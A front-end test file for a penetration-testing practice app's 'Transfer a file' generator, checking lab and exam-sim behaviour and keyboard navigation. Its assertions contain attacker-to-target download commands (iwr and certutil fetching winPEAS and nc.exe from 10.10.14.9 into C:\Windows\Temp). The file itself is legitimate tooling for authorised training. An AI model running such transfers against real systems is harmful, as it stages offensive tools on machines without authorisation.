import { QueryClientProvider } from "@tanstack/react-query";
import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter } from "react-router";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import App from "../App";
import { getLibrary, setImported } from "../engines/library/store";
import { useArsenalStore } from "../features/arsenal/useArsenalStore";
import { useCaptureStore } from "../features/capture/useCaptureStore";
import { useNotesStore } from "../features/notes/useNotesStore";
import type { LogEntryInput } from "../types/log";
import { usePaletteStore } from "../features/palette/usePaletteStore";
import { useLastEngagementStore } from "../features/arsenal/useFillScope";
import { api } from "../lib/api";
import { makeQueryClient } from "../lib/queryClient";
import type { Engagement } from "../types/engagement";
import type { Host } from "../types/host";

vi.mock("../lib/api");
vi.mock("../features/checklist/ticks", async (orig) => ({
  ...(await orig<typeof import("../features/checklist/ticks")>()),
  resyncBoards: vi.fn().mockResolvedValue(undefined),
}));
const m = vi.mocked(api, true);

const E1: Engagement = {
  id: "e1", name: "Mock exam A", kind: "lab", client: null, subLabel: null, scopeCidrs: ["10.10.10.0/24"],
  domain: null, startsAt: null, endsAt: null, timeboxStart: null, timeboxMinutes: null, status: "active",
  createdAt: 1, updatedAt: 1, lastActivityAt: null, lastRanOn: null, msfHostId: null,
};
const EXAM: Engagement = { ...E1, kind: "exam-sim" };

const MS02: Host = {
  id: "ms02", engagementId: "e1", name: "MS02", ip: "10.10.10.7", os: "windows", boardColumn: "information-gathering", boardManual: false,
  dualHomed: false, boardDerived: null, accessReviewedAt: null, adSet: null, adSetEffective: false, access: "none", createdAt: 1, updatedAt: 1,
};
const TOOLKIT = [
  { os: "windows" as const, purpose: "Enumeration", file: "winPEASx64_ofs.exe", note: "", where: "github.com/peass-ng", staged: true },
  { os: "windows" as const, purpose: "Enumeration", file: "SharpHound.exe", note: "(collector)", where: "github.com/BloodHoundAD/SharpHound", staged: false },
  { os: "linux" as const, purpose: "Enumeration", file: "linpeas.sh", note: "", where: "", staged: true },
];

const mount = (path: string, engagement = E1) => {
  m.engagementGet.mockResolvedValue(engagement);
  m.engagementsList.mockResolvedValue([engagement]);
  return render(
    <QueryClientProvider client={makeQueryClient()}>
      <MemoryRouter initialEntries={[path]}>
        <App />
      </MemoryRouter>
    </QueryClientProvider>,
  );
};

beforeEach(() => {
  localStorage.clear();
  vi.resetAllMocks();
  useCaptureStore.getState().reset();
  usePaletteStore.getState().close();
  useLastEngagementStore.setState({ engagementId: "e1", hostId: "ms02" });
  useArsenalStore.setState({ open: false, cardId: null });
  useNotesStore.setState({ open: false });
  setImported({ commands: [], cards: [], toolkit: TOOLKIT });
  m.vaultStatus.mockResolvedValue({ exists: true, unlocked: true });
  m.settingsGet.mockResolvedValue({
    autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "10.10.14.9", listenerPort: "4444", kaliUser: "kali",
    windowsToolsDir: "~/tools/windows", linuxToolsDir: "~/tools/linux", fieldManualPath: "~/fm",
  });
  m.engagementsProgress.mockResolvedValue({});
  m.hostsList.mockResolvedValue([MS02]);
  m.servicesList.mockResolvedValue([]);
  m.servicesListEngagement.mockResolvedValue([]);
  m.logList.mockResolvedValue([]);
  m.tunnelsList.mockResolvedValue([]);
  m.checklistList.mockResolvedValue([]);
  m.credentialsList.mockResolvedValue([]);
  m.credAttemptsList.mockResolvedValue([]);
  m.logCreate.mockImplementation(async (_e, input: LogEntryInput) => ({ ...input, id: "l1", engagementId: "e1", at: 1, createdAt: 1, updatedAt: 1 }) as never);
});
afterEach(() => setImported({ commands: [], cards: [] }));

const pre = (root: { findByText: typeof screen.findByText }, text: string) =>
  root.findByText((_, el) => el?.tagName === "PRE" && el.textContent === text);
/** The generator once its host has loaded (it remounts when the engagement resolves). */
const generator = async () => {
  await vi.waitFor(() =>
    expect(within(screen.getByRole("region", { name: "Transfer a file" })).getByRole("combobox", { name: "To host" })).toHaveDisplayValue("MS02"),
  );
  return screen.getByRole("region", { name: "Transfer a file" });
};

describe("Transfer a file", () => {
  it("picking winPEASx64_ofs.exe for MS02 fills serve and fetch with LHOST, FILE and DEST_DIR", async () => {
    const user = userEvent.setup();
    mount("/arsenal?generator=transfer");
    const g = within(await generator());
    await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "winPEASx64_ofs.exe");
    expect(g.getByText("1 · On Kali")).toBeInTheDocument();
    expect(g.getByText("2 · On MS02")).toBeInTheDocument();
    expect(await pre(g, "cd ~/tools/windows && python3 -m http.server 80")).toBeInTheDocument();
    expect(
      await pre(g, "iwr -Uri http://10.10.14.9/winPEASx64_ofs.exe -OutFile C:\\Windows\\Temp\\winPEASx64_ofs.exe -UseBasicParsing"),
    ).toBeInTheDocument();
    // A staged file shows no warning. The folder follows the field and is remembered per OS.
    expect(g.queryByRole("note")).not.toBeInTheDocument();
    await user.type(g.getByRole("textbox", { name: "Folder" }), "C:\\Users\\Public");
    expect(await pre(g, "iwr -Uri http://10.10.14.9/winPEASx64_ofs.exe -OutFile C:\\Users\\Public\\winPEASx64_ofs.exe -UseBasicParsing")).toBeInTheDocument();
    expect(localStorage.getItem("raven.transfer.dir.windows")).toBe("C:\\Users\\Public");
    // Another method is another tab; the serve command stays.
    await user.click(g.getByRole("tab", { name: "HTTP · certutil" }));
    expect(await pre(g, "certutil -urlcache -split -f http://10.10.14.9/winPEASx64_ofs.exe C:\\Users\\Public\\winPEASx64_ofs.exe")).toBeInTheDocument();
    expect(g.getByText("cd ~/tools/windows && python3 -m http.server 80")).toBeInTheDocument();
  });

  it("an unstaged tool shows where to get it", async () => {
    const user = userEvent.setup();
    mount("/arsenal?generator=transfer");
    const g = within(await generator());
    await user.click(await g.findByRole("combobox", { name: "Value for FILE" }));
    const list = await g.findByRole("listbox", { name: "Suggestions for FILE" });
    // Staged first; linpeas.sh is a Linux file and is not offered for a Windows host.
    expect(within(list).getAllByRole("option").map((o) => o.firstChild?.textContent)).toEqual(["winPEASx64_ofs.exe", "SharpHound.exe"]);
    await user.click(within(list).getByRole("option", { name: /SharpHound/ }));
    const note = await g.findByRole("note");
    expect(note).toHaveTextContent("not staged on Kali; get it from: github.com/BloodHoundAD/SharpHound (collector)");
  });

  it("the generator hides banned methods in exam-sim", async () => {
    const certutil = getLibrary().find((c) => c.title === "Download with certutil" && c.cardId === "shell-file-transfer-to-windows")!;
    setImported({ commands: [{ ...certutil, exam: "banned" }], cards: [], toolkit: TOOLKIT });
    const user = userEvent.setup();
    const { unmount } = mount("/arsenal?generator=transfer", EXAM);
    const g = within(await generator());
    expect(await g.findByRole("tab", { name: "HTTP · bitsadmin" })).toBeInTheDocument();
    expect(g.queryByRole("tab", { name: "HTTP · certutil" })).not.toBeInTheDocument();
    unmount();
    // In a lab the same method is offered.
    mount("/arsenal?generator=transfer");
    expect(await within(await generator()).findByRole("tab", { name: "HTTP · certutil" })).toBeInTheDocument();
    void user;
  });

  it("⌘↵ copies and logs the fetch against the host", async () => {
    const user = userEvent.setup();
    mount("/arsenal?generator=transfer");
    const g = within(await generator());
    await user.type(await g.findByRole("combobox", { name: "Value for FILE" }), "nc.exe");
    await user.keyboard("{Meta>}{Enter}{/Meta}");
    await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
    expect(m.logCreate.mock.calls[0]![1]).toMatchObject({
      hostIds: ["ms02"],
      content: { kind: "command", blocks: [{ command: "iwr -Uri http://10.10.14.9/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe -UseBasicParsing" }] },
    });
  });

  it("the palette opens the generator in Arsenal", async () => {
    const user = userEvent.setup();
    mount("/e/e1/h/ms02");
    await screen.findByRole("tab", { name: "Checklist" });
    await user.keyboard("{Meta>}k{/Meta}");
    await user.type(await screen.findByRole("combobox", { name: "Search" }), "transfer a file");
    const opt = await screen.findByRole("option", { name: "Transfer a file" });
    expect(opt).toBeInTheDocument();
    await user.keyboard("{Enter}");
    expect(await generator()).toBeInTheDocument();
  });
});

describe("Transfer a file: keyboard", () => {
  it("focuses the File field and keeps the method tabs to one Tab stop with arrow keys", async () => {
    const user = userEvent.setup();
    mount("/arsenal?generator=transfer");
    const g = within(await generator());
    await vi.waitFor(() => expect(g.getByRole("combobox", { name: "Value for FILE" })).toHaveFocus());
    const tabs = g.getAllByRole("tab");
    expect(tabs.filter((t) => t.tabIndex === 0)).toHaveLength(1);
    tabs[0]!.focus();
    await user.keyboard("{ArrowRight}");
    expect(tabs[1]).toHaveFocus();
    expect(tabs[1]).toHaveAttribute("aria-selected", "true");
    expect(tabs[1]!.tabIndex).toBe(0);
    expect(tabs[0]!.tabIndex).toBe(-1);
    await user.keyboard("{End}");
    expect(tabs.at(-1)).toHaveFocus();
    await user.keyboard("{ArrowRight}");
    expect(tabs[0]).toHaveFocus();
    await user.keyboard("{ArrowLeft}");
    expect(tabs.at(-1)).toHaveFocus();
    await user.keyboard("{Home}");
    expect(tabs[0]).toHaveFocus();
  });
});
